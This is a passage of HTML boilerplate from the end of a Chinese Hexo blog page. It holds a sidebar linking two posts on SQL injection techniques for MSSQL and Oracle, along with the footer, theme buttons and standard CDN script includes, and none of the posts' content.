class="title" href="/posts/23017.html" title="SQL注入技术总结-Mssql">SQL注入技术总结-Mssql</a><time datetime="2023-10-24T03:23:58.000Z" title="发表于 2023-10-24 11:23:58">2023-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/64193.html" title="SQL注入技术总结-Oracle"><img src="/img/16.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SQL注入技术总结-Oracle"/></a><div class="content"><a class="title" href="/posts/64193.html" title="SQL注入技术总结-Oracle">SQL注入技术总结-Oracle</a><time datetime="2023-10-24T03:21:34.000Z" title="发表于 2023-10-24 11:21:34">2023-10-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/12.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Flyink</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div></body></html>
